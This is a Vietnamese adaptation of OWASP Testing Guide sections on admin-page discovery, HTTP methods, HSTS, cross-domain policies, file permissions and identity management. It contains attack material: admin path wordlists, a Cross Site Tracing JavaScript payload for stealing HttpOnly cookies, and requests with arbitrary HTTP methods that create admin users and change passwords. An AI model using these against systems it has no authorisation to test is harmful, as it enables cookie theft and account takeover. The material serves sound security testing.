Cần tiến hành kiểm tra chi tiết hơn về máy chủ và các thành phần ứng dụng để đảm bảo tăng cường (nghĩa là mọi người không thể truy cập trang quản trị viên thông qua việc sử dụng tính năng lọc IP hoặc các điều khiển khác) và nếu có thể, xác minh rằng tất cả các thành phần không sử dụng thông tin đăng nhập mặc định hoặc cấu hình.

Mã nguồn nên được xem xét để đảm bảo rằng authorization module và authentication model đảm bảo phân chia rõ ràng nhiệm vụ giữa người dùng bình thường và quản trị viên trang web.

Mỗi framework web có thể có các trang hoặc đường dẫn mặc định của quản trị viên riêng. Ví dụ:

WebSphere:
```
/admin
/admin-authz.xml
/admin.conf
/admin.passwd
/admin/*
/admin/logon.jsp
/admin/secure/logon.jsp
```

PHP:
```
/phpinfo
/phpmyadmin/
/phpMyAdmin/
/mysqladmin/
/MySQLadmin
/MySQLAdmin
/login.php
/logon.php
/xmlrpc.php
/dbadmin
```

FrontPage:
```
/admin.dll
/admin.exe
/administrators.pwd
/author.dll
/author.exe
/author.log
/authors.pwd
/cgi-bin
```
WebLogic:
```
/AdminCaptureRootCA
/AdminClients
/AdminConnections
/AdminEvents
/AdminJDBC
/AdminLicense
/AdminMain
/AdminProps
/AdminRealm
/AdminThreads
```

WordPress:
```
wp-admin/
wp-admin/about.php
wp-admin/admin-ajax.php
wp-admin/admin-db.php
wp-admin/admin-footer.php
wp-admin/admin-functions.php
wp-admin/admin-header.php
```

**Tools**

Dirbuster (dự án OWASP hiện không hoạt động) vẫn là một công cụ tuyệt vời để brute force các thư mục và tệp trên máy chủ.
THC-HYDRA là một công cụ cho phép brute-force nhiều giao diện, bao gồm orm-based HTTP authentication.
A brute force tools sẽ hiệu quả hơn khi nó sử dụng một wordlist tốt, chẳng hạn như wordlist netsparker.

##### Example report

Sử dụng ffuf để tìm và xác định các thư mục ẩn có thể có trong các trang web

![](img/4-3/4.3.5%20ffuf-firectory-bursting.avif)




#### 4.3.6 OTG-CONFIG-006 (Test HTTP Methods)

##### Summary

HTTP cung cấp một số phương thức có thể được sử dụng để thực hiện các hành động trên máy chủ web. Nhiều phương pháp trong số này được thiết kế để hỗ trợ các nhà phát triển triển khai và thử nghiệm các ứng dụng HTTP. Các phương thức HTTP này có thể được sử dụng cho mục đích bất chính nếu máy chủ web bị định cấu hình sai. Ngoài ra, Cross Site Tracing (XST), XSS sử dụng phương pháp HTTP TRACE của máy chủ để đánh cắp thông tin người dùng.

Mặc dù GET và POST cho đến nay là những phương thức phổ biến nhất được sử dụng để truy cập thông tin do máy chủ web cung cấp, nhưng HTTP cho phép một số phương thức khác (và ít được biết đến hơn). RFC 2616 (mô tả phiên bản HTTP 1.1 là tiêu chuẩn hiện nay) xác định tám phương thức sau:

- HEAD
- GET
- POST
- PUT
- DELETE
- TRACE
- OPTIONS
- CONNECT

Một số phương thức này có khả năng gây rủi ro bảo mật cho ứng dụng web vì chúng cho phép kẻ tấn công sửa đổi các tệp được lưu trữ trên máy chủ web, đánh cắp thông tin xác thực của người dùng. Cụ thể hơn:

- PUT: Phương pháp này cho phép client tải lên các tệp mới trên máy chủ web. Kẻ tấn công có thể khai thác nó bằng cách tải lên các tệp độc hại (ví dụ: tệp asp thực thi các lệnh bằng cách gọi cmd.exe) hoặc đơn giản bằng cách sử dụng máy chủ của nạn nhân làm kho lưu trữ tệp.

- DELETE: Phương pháp này cho phép client xóa một tệp trên máy chủ web. Kẻ tấn công có thể khai thác nó như một cách rất đơn giản và trực tiếp để phá hoại một trang web hoặc thực hiện một cuộc tấn công DoS.

- CONNECT: Phương pháp này có thể cho phép client sử dụng máy chủ web làm proxy.

- TRACE: Phương pháp này chỉ đơn giản là phản hồi lại máy khách bất kỳ chuỗi nào đã được gửi đến máy chủ và được sử dụng chủ yếu cho mục đích gỡ lỗi. Kẻ tấn công có thể lợi dụng nó để thấy thông tin người dùng.

Nếu một ứng dụng cần một hoặc nhiều phương thức này, chẳng hạn như Dịch vụ web REST (có thể yêu cầu PUT hoặc DELETE), thì điều quan trọng là phải kiểm tra xem việc sử dụng chúng có được giới hạn phù hợp với người dùng đáng tin cậy và các điều kiện an toàn hay không.

*Arbitrary HTTP Methods*

Nhiều frameworks web cho phép các method HTTP tùy ý hoặc được lựa chọn kỹ càng để vượt qua kiểm tra, kiểm soát truy cập:

- Nhiều frameworks và languages coi "HEAD" là yêu cầu "GET", mặc dù yêu cầu không có nội dung nào trong phản hồi. Nếu một ràng buộc bảo mật được đặt cho các yêu cầu "GET" sao cho chỉ "Người dùng được xác thực" mới có thể truy cập các yêu cầu GET cho một servlet hoặc tài nguyên cụ thể, thì nó sẽ bị bỏ qua đối với phiên bản "HEAD"

- Một số frameworks cho phép sử dụng các phương thức HTTP tùy ý như "JEFF" hoặc "CATS" mà không bị giới hạn. Chúng được xử lý như thể một phương thức "GET".

**How to Test**

*Discover the Supported Methods*

1. Để thực hiện kiểm tra này, người kiểm tra cần một số cách để tìm ra phương thức HTTP nào được hỗ trợ bởi máy chủ web đang được kiểm tra. Phương thức OPTIONS HTTP cung cấp cho người thử nghiệm cách trực tiếp và hiệu quả nhất để thực hiện điều đó. RFC 2616 cho biết rằng, "method OPTIONS thể hiện yêu cầu cung cấp thông tin về các tùy chọn giao tiếp có sẵn trên chuỗi request/response được xác định bởi Request-URI".

    Phương pháp kiểm tra cực kỳ đơn giản và chúng ta chỉ cần kích hoạt netcat (hoặc telnet):

    ```
    $ nc www.victim.com 80 
    OPTIONS / HTTP/1.1
    Host: www.victim.com

    HTTP/1.1 200 OK
    Server: Microsoft-IIS/5.0
    Date: Tue, 31 Oct 2006 08:00:29 GMT
    Connection: close
    Allow: GET, HEAD, POST, TRACE, OPTIONS
    Content-Length: 0
    ```

2. Như chúng ta có thể thấy trong ví dụ, OPTIONS cung cấp danh sách các phương thức được máy chủ web hỗ trợ và trong trường hợp này, chúng ta có thể thấy rằng phương thức TRACE đã được bật. Sự nguy hiểm gây ra bởi phương thức này được minh họa trong phần sau

    Test tương tự cũng có thể được thực hiện bằng cách sử dụng nmap và tập lệnh http-methods NSE:

    ```
    C:\Tools\nmap-6.40>nmap -p 443 --script http-methods localhost

    Starting Nmap 6.40 ( http://nmap.org ) at 2015-11-04 11:52 Romance Standard Time

    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.0094s latency).
    PORT    STATE SERVICE
    443/tcp open  https
    | http-methods: OPTIONS TRACE GET HEAD POST
    | Potentially risky methods: TRACE
    |_See http://nmap.org/nsedoc/scripts/http-methods.html

    Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
    ```

*Test XST Potential*

1. Phương pháp TRACE, mặc dù rõ ràng là vô hại, nhưng có thể được tận dụng thành công trong một số trường hợp để đánh cắp thông tin xác thực của người dùng hợp pháp. Gắn thẻ cookie là httpOnly cấm JavaScript truy cập cookie, bảo vệ cookie khỏi bị gửi cho bên thứ ba. Tuy nhiên, phương pháp TRACE có thể được sử dụng để bỏ qua lớp bảo vệ này và truy cập cookie ngay cả trong trường hợp này.

    Như đã đề cập, TRACE chỉ cần trả về bất kỳ chuỗi nào được gửi đến máy chủ web. Để xác minh sự hiện diện của nó (hoặc để kiểm tra kỹ kết quả của yêu cầu OPTIONS được hiển thị ở trên), Tester có thể tiến hành như minh họa trong ví dụ sau:

    ```
    $ nc www.victim.com 80
    TRACE / HTTP/1.1
    Host: www.victim.com

    HTTP/1.1 200 OK
    Server: Microsoft-IIS/5.0
    Date: Tue, 31 Oct 2006 08:01:48 GMT
    Connection: close
    Content-Type: message/http
    Content-Length: 39

    TRACE / HTTP/1.1
    Host: www.victim.com
    ```

    Tận dụng một lỗ hổng phía server: kẻ tấn công đưa đoạn mã JavaScript có chứa yêu cầu TRACE vào ứng dụng dễ bị tấn công, như trong một cuộc tấn công XSS thông thường
    
    Tận dụng lỗ hổng phía client: kẻ tấn công tạo một trang web độc hại có chứa đoạn mã JavaScript và khai thác một số lỗ hổng cross-domain của trình duyệt của nạn nhân, để làm cho mã JavaScript thực hiện thành công kết nối đến trang web hỗ trợ TRACE và đó là nguồn gốc của cookie mà kẻ tấn công đang cố đánh cắp.

*Testing for arbitrary HTTP methods*

1. Tìm một trang để truy cập có ràng buộc bảo mật sao cho trang đó thường buộc chuyển hướng (khi response status là 302 Found) đến trang đăng nhập hoặc buộc đăng nhập trực tiếp. Nếu response trả về status 200 mà không phải là trang đăng nhập, thì có thể bỏ qua authentication (xác thực) và do đó bỏ qua authorization (ủy quyền).

    ```
    $ nc www.example.com 80
    JEFF / HTTP/1.1
    Host: www.example.com

    HTTP/1.1 200 OK
    Date: Mon, 18 Aug 2008 22:38:40 GMT
    Server: Apache
    Set-Cookie: PHPSESSID=K53QW...
    ```

2. Nếu framework hoặc tường lửa hoặc ứng dụng không hỗ trợ phương thức "JEFF", nó sẽ đưa ra một trang lỗi (405 Not Allowed hoặc 501 Method Unimplemented). Nếu nó cho phép method đó, nó dễ bị vấn đề khi attacker thực hiện các cuộc tấn công giống như CSRF để khai thác:

    ```
    FOOBAR /admin/createUser.php?member=myAdmin
    JEFF /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123
    CATS /admin/groupEdit.php?group=Admins&member=myAdmin&action=add
    ```

*Testing for HEAD access control bypass*

1. Tìm một trang để truy cập có ràng buộc bảo mật sao cho trang đó thường buộc chuyển hướng 302 đến trang đăng nhập hoặc buộc đăng nhập trực tiếp. URL thử nghiệm trong ví dụ này hoạt động như thế này, giống như nhiều ứng dụng web. Tuy nhiên, nếu người thử nghiệm nhận được phản hồi "200" không phải là trang đăng nhập, thì có thể bỏ qua xác thực và do đó có thể bỏ qua ủy quyền.

    ```
    $ nc www.example.com 80
    HEAD /admin HTTP/1.1
    Host: www.example.com

    HTTP/1.1 200 OK
    Date: Mon, 18 Aug 2008 22:44:11 GMT
    Server: Apache
    Set-Cookie: PHPSESSID=pKi...; path=/; HttpOnly
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
    Pragma: no-cache
    Set-Cookie: adminOnlyCookie1=...; expires=Tue, 18-Aug-2009 22:44:31 GMT; domain=www.example.com
    Set-Cookie: adminOnlyCookie2=...; expires=Mon, 18-Aug-2008 22:54:31 GMT; domain=www.example.com
    Set-Cookie: adminOnlyCookie3=...; expires=Sun, 19-Aug-2007 22:44:30 GMT; domain=www.example.com
    Content-Language: EN
    Connection: close
    Content-Type: text/html; charset=ISO-8859-1
    ```

    Nếu test thấy "405 Method not allowed" hoặc "501 Method Unimplemented", nếu mã phản hồi "200" xuất hiện trở lại và phản hồi không chứa nội dung nào, thì có khả năng ứng dụng đã xử lý yêu cầu mà không cần xác thực hoặc ủy quyền và cần phải kiểm tra thêm.

    Nếu tester cho rằng hệ thống dễ bị ảnh hưởng bởi vấn đề này, họ nên thực hiện các cuộc tấn công giống như CSRF để khai thác vấn đề đầy đủ hơn:

    ```
    HEAD /admin/createUser.php?member=myAdmin
    HEAD /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123
    HEAD /admin/groupEdit.php?group=Admins&member=myAdmin&action=add
    ```

**Tools**

NetCat - http://nc110.sourceforge.net
cURL - http://curl.haxx.se/
nmap http-methods NSE script - https://nmap.org/nsedoc/scripts/http-methods.html

##### Example report

Ví dụ về XST:

Trang web target bị dính lỗ hổng XSS nhưng cho HttpOnly được bật nên cookie không thể được lấy ra bằng javascript thông thường.

Sử dụng payload bê trên với TRACE method để có thể lấy được cookie:
```html
<script>
  var xmlhttp = new XMLHttpRequest();
  var url = 'https://test.lab/';

  xmlhttp.withCredentials = true; // send cookie header
  xmlhttp.open('TRACE', url, false);
  xmlhttp.send();
</script>
```

Và ta thấy cookie nằm trong response trả về

![](img/4-3/4.3.6%20xst-headers.png)

#### 4.3.7 OTG-CONFIG-007 (Test HTTP Strict Transport Security)

##### Summary

Header HTTP Strict Transport Security (HSTS) là một cơ chế mà các trang web phải giao tiếp với các trình duyệt web rằng tất cả lưu lượng trao đổi với một miền nhất định phải luôn được gửi qua https, điều này sẽ giúp bảo vệ thông tin khỏi bị chuyển qua các yêu cầu không được mã hóa.

Tính năng HTTP Strict Transport Security (HSTS) cho phép ứng dụng web thông báo cho trình duyệt, thông qua việc sử dụng header phản hồi đặc biệt, rằng nó sẽ không bao giờ thiết lập kết nối với các máy chủ miền được chỉ định bằng HTTP. Thay vào đó, nó sẽ tự động thiết lập tất cả các yêu cầu kết nối để truy cập trang web thông qua HTTPS.

Header HTTP strict transport security sử dụng hai chỉ thị:

- max-age: để cho biết số giây mà trình duyệt sẽ tự động chuyển đổi tất cả các yêu cầu HTTP thành HTTPS.
- includeSubDomains: để chỉ ra rằng tất cả các miền phụ của ứng dụng web phải sử dụng HTTPS.

Ví dụ:

```
Strict-Transport-Security: max-age=60000; includeSubDomains
```

**How to Test**

Kiểm tra sự tồn tại của header HSTS có thể được thực hiện bằng cách kiểm tra bằng cách sử dụng curl như sau:
   ```
   $ curl -s -D- https://domain.com/ | grep Strict
   ```
Result expected:
   ```
   Strict-Transport-Security: max-age=...
   ```

##### Example report

Ví dụ khi web application không sử dụng https, attacker sẽ tìm kiếm trong network traffic các request http lấy những thông tin nhậy cảm:

Sử dụng wireshark

![](img/4-3/4.3.7%20HTTP_GET.png)

#### 4.3.8 OTG-CONFIG-008 (Test RIA cross domain policy)

##### Summary

Rich Internet Applications (RIA) đã sử dụng các tệp chính sách crossdomain.xml của Adobe để cho phép truy cập tên miền chéo có kiểm soát vào dữ liệu và mức tiêu thụ dịch vụ bằng cách sử dụng các công nghệ như Oracle Java, Silverlight và Adobe Flash. Do đó, một miền có thể cấp quyền truy cập từ xa vào các dịch vụ của mình từ một miền khác. Tuy nhiên, thường thì các tệp chính sách mô tả các hạn chế truy cập được định cấu hình kém. Cấu hình kém của các tệp chính sách cho phép tấn công giả mạo yêu cầu trên nhiều trang web và có thể cho phép các bên thứ ba truy cập dữ liệu nhạy cảm dành cho người dùng.

**What are cross-domain policy files?**

Cross-domain policy chỉ định các quyền mà ứng dụng web như Java, Adobe Flash, Adobe Reader, v.v. sử dụng để truy cập dữ liệu trên các tên miền khác nhau. Đối với Silverlight, Microsoft đã sử dụng một tập con của crossdomain.xml của Adobe, đồng thời tạo thêm tệp chính sách tên miền chéo của chính nó: clientaccesspolicy.xml.


Bất cứ khi nào client web phát hiện thấy tài nguyên phải được yêu cầu từ miền khác, trước tiên, nó sẽ tìm  policy file trong miền đích để xác định xem việc thực hiện các yêu cầu giữa nhiều miền, bao gồm header và kết nối socket-based có được phép hay không.

1. Crossdomain.xml vs. Clientaccesspolicy.xml

   Hầu hết các ứng dụng RIA đều hỗ trợ crossdomain.xml. Tuy nhiên, trong trường hợp của Silverlight, nó sẽ chỉ hoạt động nếu crossdomain.xml chỉ định rằng quyền truy cập được phép từ bất kỳ miền nào. Để kiểm soát chi tiết hơn với Silverlight, phải sử dụng clientaccesspolicy.xml.

   Các policy files cấp một số loại quyền:

    - Các policy files được chấp nhận (Các policy files có thể vô hiệu hóa hoặc hạn chế các policy files cụ thể khác)
    - Sockets permissions
    - Header permissions
    - Quyền truy cập HTTP/HTTPS
    - Allowing access based on cryptographic credentials

    Một ví dụ về policy files quá dễ dãi:

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE cross-domain-policy SYSTEM
    "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
    <cross-domain-policy>
    <site-control permitted-cross-domain-policies="all"/>
    <allow-access-from domain="*" secure="false"/>
    <allow-http-request-headers-from domain="*" headers="*" secure="false"/>
    </cross-domain-policy>
    ```

**How can cross domain policy files be abused?**

- Overly permissive cross-domain policies.
- Generating server responses that may be treated as cross-domain policy files.
- Sử dụng chức năng upload file để tải lên các tệp có thể được coi là tệp cross-domain policy.

**Impact of abusing cross-domain access**

- Bypass các biện pháp bảo vệ CSRF.
- Đọc dữ liệu bị hạn chế hoặc được bảo vệ bởi các chính sách nguồn gốc chéo.

**How to Test**

*Testing for RIA policy files weakness:*

1. Để kiểm tra điểm yếu của tệp chính sách RIA, người kiểm tra nên thử truy xuất các tệp chính sách crossdomain.xml và clientaccesspolicy.xml từ thư mục gốc của ứng dụng và từ mọi thư mục được tìm thấy.

    Ví dụ: nếu URL của ứng dụng là http://www.owasp.org, người kiểm tra nên thử tải xuống các tệp http://www.owasp.org/crossdomain.xml và http://www.owasp.org/clientaccesspolicy.xml.

    Sau khi truy xuất tất cả các policy files, các quyền được phép phải được kiểm tra theo nguyên tắc đặc quyền tối thiểu. Các yêu cầu chỉ nên đến từ các miền, cổng hoặc giao thức cần thiết. Nên tránh các chính sách quá dễ dãi. Các chính sách có dấu "*" trong đó cần được kiểm tra chặt chẽ.

    Ví dụ:
    ```
    <cross-domain-policy> 
    <allow-access-from domain="*" /> 
    </cross-domain-policy>
    ```

*Result Expected:*
- Tìm thấy danh sách các policy filesh.
- Danh sách các cài đặt yếu trong policy.

**Tools**

- Nikto
- OWASP Zed Attack Proxy Project
- W3af

##### Example report

...


#### 4.3.9 OTG-CONFIG-009 (Test File Permission)

##### Summary

Cấu hình quyền truy cập tệp không đúng cách có thể dẫn đến leo thang quyền riêng tư, khai thác thông tin, chèn DLL hoặc truy cập tệp trái phép.

Do đó, quyền truy cập tệp phải được định cấu hình đúng với quyền truy cập tối thiểu theo mặc định. Quyền đối với tệp cần được định cấu hình bao gồm: 

- Tệp/thư mục web
- Tệp/thư mục configuration
- Tệp nhạy cảm (dữ liệu được mã hóa, mật khẩu, khóa)/thư mục
- Tệp log (log bảo mật, log hoạt động, log quản trị)/thư mục
- Các tệp thực thi (tập lệnh, EXE, JAR, lớp, PHP, ASP)/thư mục
- Tệp/thư mục cơ sở dữ liệu
- Tệp/thư mục tạm thời
- Tải lên tập tin/thư mục

**How to Test**

*Review file Permission*

Trong linux, sử dụng lệnh `ls` để kiểm tra quyền của tệp. Ngoài ra, `namei` cũng có thể được sử dụng để liệt kê đệ quy quyền của tệp.

```
$ namei -l /PathToCheck/ 
```
Nói chung, quyền truy cập tệp được đề xuất như bên dưới.
```

|File Type	                            |Configuration  |
|-                                      |-              | 
|Scripts	                            |750 (rwx-wx---)|
|Scripts directory 	                    |750 (rwx-wx---)|
|Configuration	                        |600 (rw-------)|
|Configuration Directory	            |700 (rwx------)|
|Log files	                            |640 (rw-r-----)|
|Archieved Log files	                |400 (r--------)|
|Log files directory	                |700 (rwx------)|
|Debug files	                        |600 (rw-------)|
|Debug files directory	                |700 (rwx------)|
|database files	                        |600 (rw-------)|
|database files direcotry	            |700 (rwx------)|
|Sensitive info files (Key, encryption)	|600 (rw-------)|
```
**Tools**
Windows AccessEnum https://technet.microsoft.com/en-us/sysinternals/accessenum
Windows AccessChk https://technet.microsoft.com/en-us/sysinternals/accesschk
Linux namei

##### Example report

...




### 4.4 OTG-IDENT (Testing Identity Management)

#### 4.4.1 OTG-IDENT-001 (Test Role Definitions)

##### Summary

Các doanh nghiệp hiện đại thường xác định vai trò hệ thống để quản lý người dùng và phân quyền đối với tài nguyên hệ thống. Trong hầu hết các triển khai hệ thống, người ta mong đợi có ít nhất hai vai trò tồn tại, quản trị viên và người dùng thông thường. Vai trò đầu tiên đại diện cho vai trò cho phép truy cập vào thông tin và chức năng đặc quyền và nhạy cảm, vai trò thứ hai đại diện cho vai trò cho phép truy cập vào thông tin và chức năng kinh doanh thông thường. Các vai trò được phát triển tốt phải phù hợp với các quy trình kinh doanh được ứng dụng hỗ trợ.

**Test objectives**

Xác thực các vai trò được định nghĩa trong hệ thống ứng dụng, xác định đầy đủ và tách biệt từng vai trò hệ thống và doanh nghiệp để quản lý quyền truy cập phù hợp vào chức năng và thông tin của hệ thống.

**How to test**

Dù có hoặc không có sự trợ giúp của nhà phát triển hệ thống hoặc quản trị viên, hãy phát triển vai trò so với ma trận quyền. Ma trận sẽ liệt kê tất cả các vai trò có thể được cung cấp và khám phá các quyền được phép áp dụng cho các đối tượng bao gồm mọi ràng buộc. Nếu một ma trận được cung cấp cùng với ứng dụng, thì ma trận đó phải được người kiểm tra xác thực, nếu nó không tồn tại, thì người kiểm tra sẽ tạo nó và xác định xem ma trận có đáp ứng chính sách truy cập mong muốn cho ứng dụng hay không.

##### Example report

Example 1

|ROLE	|PERMISSION	|OBJECT	|CONSTRAINTS|
|-      |-          |-      |-          |
|Administrator	|Read	|Customer records	|
|Manager	|Read	|Customer records	|Only records related to business unit|
|Staff	|Read	|Customer records	|Only records associated with customers assigned by Manager|
|Customer	|Read	|Customer record	|Only own record|


#### 4.4.2 OTG-IDENT-002 (Test User Registration Process)

##### Summary

Một số trang web cung cấp quy trình đăng ký người dùng tự động hóa (hoặc bán tự động hóa) việc cung cấp quyền truy cập hệ thống cho người dùng. Các yêu cầu nhận dạng để truy cập khác nhau từ nhận dạng tích cực đến không nhận dạng gì cả, tùy thuộc vào các yêu cầu bảo mật của hệ thống. Nhiều ứng dụng công cộng hoàn toàn tự động hóa quy trình đăng ký và cung cấp vì quy mô của cơ sở người dùng khiến việc quản lý thủ công là không thể. Tuy nhiên, nhiều ứng dụng của công ty sẽ cung cấp thủ công cho người dùng, vì vậy trường hợp test này có thể không áp dụng.

**Test objectives**

1. Xác minh rằng các yêu cầu nhận dạng để đăng ký người dùng phù hợp với các yêu cầu kinh doanh và bảo mật.
2. Xác thực quá trình đăng ký

**How to Test**

1. Xác minh rằng các yêu cầu nhận dạng để đăng ký người dùng phù hợp với các yêu cầu kinh doanh và bảo mật:

- Bất cứ ai có thể đăng ký để truy cập?
- Đăng ký có được con người kiểm tra trước khi cung cấp hay chúng được cấp tự động nếu đáp ứng các tiêu chí?
- Cùng một người hoặc danh tính có thể đăng ký nhiều lần không?
- Người dùng có thể đăng ký các vai trò hoặc quyền khác nhau không?
- Bằng chứng nhận dạng nào là cần thiết để đăng ký thành công?
- Danh tính đã đăng ký có được xác minh không?

2. Xác nhận quá trình đăng ký:

- Thông tin nhận dạng có thể dễ dàng giả mạo hoặc làm giả?
- Việc trao đổi thông tin nhận dạng có thể bị thao túng trong quá trình đăng ký không?

##### Example report

Trong ví dụ về WordPress bên dưới, yêu cầu nhận dạng duy nhất là địa chỉ email mà người đăng ký có thể truy cập được.

![](img/4-4/4.4.2%20Wordpress_registration_page.jpg)

#### 4.4.3 OTG-IDENT-003 (Test Account Provisioning Process)

##### Summary

Việc cung cấp tài khoản tạo cơ hội cho kẻ tấn công tạo tài khoản hợp lệ mà không cần áp dụng quy trình nhận dạng và ủy quyền thích hợp.

**Test objectives**

Xác minh tài khoản nào có thể cung cấp tài khoản khác và thuộc loại nào.

**How to Test**

Xác định vai trò nào có thể cấp phép cho người dùng và loại tài khoản nào họ có thể cấp phép.

- Có bất kỳ xác minh, kiểm tra và ủy quyền nào đối với các yêu cầu cung cấp không?
- Có bất kỳ xác minh, kiểm tra và ủy quyền nào đối với các yêu cầu hủy cung cấp không?
- Quản trị viên có thể cấp phép cho các quản trị viên khác hay chỉ người dùng không?
- Quản trị viên hoặc người dùng khác có thể cung cấp tài khoản với các đặc quyền lớn hơn của họ không?
- Quản trị viên hoặc người dùng có thể tự hủy cấp phép không?
- Các tệp hoặc tài nguyên do người dùng hủy cấp phép sở hữu được quản lý như thế nào? Chúng có bị xóa không? Quyền truy cập có được chuyển giao không?

##### Example report

Trong WordPress, chỉ cần tên và địa chỉ email của người dùng để cung cấp cho người dùng, như được hiển thị bên dưới:

![](img/4-4/4.4.3%20Wordpress_useradd.png)

Việc hủy cấp phép người dùng yêu cầu quản trị viên chọn người dùng sẽ hủy cấp phép, chọn Xóa từ menu thả xuống (khoanh tròn) rồi áp dụng hành động này. Sau đó, quản trị viên sẽ thấy một hộp thoại hỏi phải làm gì với các bài đăng của người dùng (xóa hoặc chuyển chúng).

![](img/4-4/4.4.3%20Wordpress_authandusers.png)

#### 4.4.4 OTG-IDENT-004 (Testing for Account Enumeration and Guessable User Account)

##### Summary

Phạm vi của thử nghiệm này là xác minh xem có thể thu thập một nhóm tên người dùng hợp lệ hay không bằng cách tương tác với cơ chế xác thực của ứng dụng. Thử nghiệm này sẽ hữu ích cho thử nghiệm brute force, trong đó người thử nghiệm xác minh xem, với tên người dùng hợp lệ, có thể tìm thấy mật khẩu tương ứng hay không.

Thông thường, các ứng dụng web tiết lộ thời điểm tên người dùng tồn tại trên hệ thống, do cấu hình sai hoặc do quyết định thiết kế. Ví dụ: đôi khi, khi chúng ta gửi thông tin đăng nhập sai, chúng ta nhận được thông báo cho biết rằng tên người dùng có trên hệ thống hoặc mật khẩu được cung cấp là sai. Thông tin thu được có thể được kẻ tấn công sử dụng để lấy danh sách người dùng trên hệ thống. Thông tin này có thể được sử dụng để tấn công ứng dụng web, chẳng hạn như thông qua tấn công vũ phu hoặc tấn công tên người dùng và mật khẩu mặc định.

Trong một số trường hợp, một thông báo được nhận cho biết liệu thông tin xác thực được cung cấp có sai do tên người dùng không hợp lệ hoặc mật khẩu không hợp lệ đã được sử dụng hay không. Đôi khi, người kiểm tra có thể liệt kê những người dùng hiện có bằng cách gửi tên người dùng và mật khẩu trống.

**How to Test**

Trong black box test, tester không biết gì về ứng dụng cụ thể, tên người dùng, logic ứng dụng, thông báo lỗi trên trang đăng nhập hoặc phương tiện khôi phục mật khẩu. Nếu ứng dụng dễ bị tổn thương, người kiểm tra sẽ nhận được thông báo phản hồi tiết lộ, trực tiếp hoặc gián tiếp, một số thông tin hữu ích cho việc liệt kê người dùng.

*HTTP Response message*

Nói chung, ứng dụng sẽ phản hồi với cùng một thông báo lỗi và độ dài cho các yêu cầu không chính xác khác nhau. Nếu các response không giống nhau, tester nên điều tra và tìm ra mấu chốt tạo ra sự khác biệt giữa hai response. 

Ví dụ:

- Yêu cầu của client: username hợp lệ/mật khẩu sai -> response của server: 'Mật khẩu không chính xác'
- Yêu cầu của client: username sai/mật khẩu sai -> response của server: 'Không nhận dạng được username'
- Các phản hồi ở trên cho phép client hiểu rằng đối với yêu cầu đầu tiên, họ có tên username hợp lệ. Vì vậy, họ có thể tương tác với ứng dụng yêu cầu một bộ ID username có thể và quan sát response.

Nhìn vào phản hồi của server thứ hai, tester cũng hiểu rằng họ không có tên người dùng hợp lệ. Vì vậy, họ có thể tương tác theo cách tương tự và tạo danh sách ID người dùng hợp lệ khi xem response của server.

*Other ways to enumerate users*

Testers có thể liệt kê người dùng theo nhiều cách, chẳng hạn như:

1. Analyzing the error code received on login pages

    Một số ứng dụng web đưa ra mã lỗi hoặc thông báo cụ thể mà chúng ta có thể phân tích.

2. Analyzing URLs and URLs re-directions

    Ví dụ:
    ```
    http://www.foo.com/err.jsp?User=baduser&Error=0

    http://www.foo.com/err.jsp?User=gooduser&Error=2
    ```
    Như đã thấy ở trên, khi người kiểm tra cung cấp ID người dùng và mật khẩu cho ứng dụng web, ta sẽ thấy một thông báo cho biết đã xảy ra lỗi trong URL. Trong trường hợp đầu tiên, ta đã cung cấp ID người dùng không hợp lệ và mật khẩu không hợp lệ. Trong trường hợp thứ hai, ID người dùng hợp lệ và mật khẩu không hợp lệ để ta có thể xác định ID người dùng hợp lệ.

3. URI Probing

    Đôi khi một máy chủ web phản hồi khác nhau nếu nó nhận được yêu cầu cho một thư mục hiện có hay không.


    Một lỗi rất phổ biến nhận được từ máy chủ web là:
    ```
    403 Forbidden error code 
    ```

    Và
    ```
    404 Not found error code
    ```

    Ví dụ
    ```
    http://www.foo.com/account1 - chúng ta nhận được từ máy chủ web: 403 Forbidden
    http://www.foo.com/account2 - chúng ta nhận được từ máy chủ web: 404  404 file Not Found
    ```

    Trong trường hợp đầu tiên, người dùng tồn tại, nhưng người kiểm tra không thể xem trang web, trong trường hợp thứ hai, thay vào đó, người dùng “account2” không tồn tại. Bằng cách thu thập thông tin này, người kiểm tra có thể liệt kê người dùng.

4. Analyzing Web page Titles

    Tester có thể nhận được thông tin hữu ích trên Title của trang web, nơi họ có thể nhận được mã lỗi cụ thể hoặc thông báo tiết lộ nếu sự cố xảy ra với tên người dùng hoặc mật khẩu.


    Chẳng hạn, nếu người dùng không thể xác thực ứng dụng và nhận được một trang web có tiêu đề tương tự như:

    ```
    Invalid user
    Invalid authentication
    ```

5. Analyzing a message received from a recovery facility

    Khi chúng ta sử dụng một tính năng khôi phục (tức là chức năng quên mật khẩu), một ứng dụng dễ bị tấn công có thể trả về một thông báo cho biết tên người dùng có tồn tại hay không.

    Ví dụ: thông báo tương tự như sau:
    
    ```
    Invalid username: e-mail address is not valid or the specified user was not found.
    Valid username: Your password has been successfully sent to the email address you registered with.
    ```

6. Friendly 404 Error Message

    Khi chúng ta yêu cầu một người dùng trong thư mục không tồn tại, không phải lúc nào chúng ta cũng nhận được mã lỗi 404. Thay vào đó, chúng ta có thể nhận được “200 ok” với một hình ảnh, trong trường hợp này, chúng ta có thể cho rằng khi chúng ta nhận được hình ảnh cụ thể thì người dùng không tồn tại. Logic này có thể được áp dụng cho phản hồi của máy chủ web khác; thủ thuật là phân tích tốt các thông báo của máy chủ web và ứng dụng web.

*Guessing Users*

1. Trong một số trường hợp, ID người dùng được tạo bằng các chính sách cụ thể của quản trị viên hoặc công ty. Ví dụ: chúng ta có thể xem người dùng có ID người dùng được tạo theo thứ tự tuần tự:

    CN000100
    CN000101
    ….
2. Trong mẫu ở trên, chúng ta có thể tạo các tập lệnh shell đơn giản để soạn ID người dùng và gửi yêu cầu bằng công cụ như wget để tự động truy vấn web nhằm phân biệt ID người dùng hợp lệ. Để tạo tập lệnh, chúng ta cũng có thể sử dụng Perl và CURL.


    Các khả năng khác là: - ID người dùng được liên kết với số thẻ tín dụng hoặc nói chung là các số có mẫu. - ID người dùng được liên kết với tên thật, ví dụ: nếu Freddie Mercury có ID người dùng là "fmercury", thì bạn có thể đoán Roger Taylor có ID người dùng là "rtaylor".
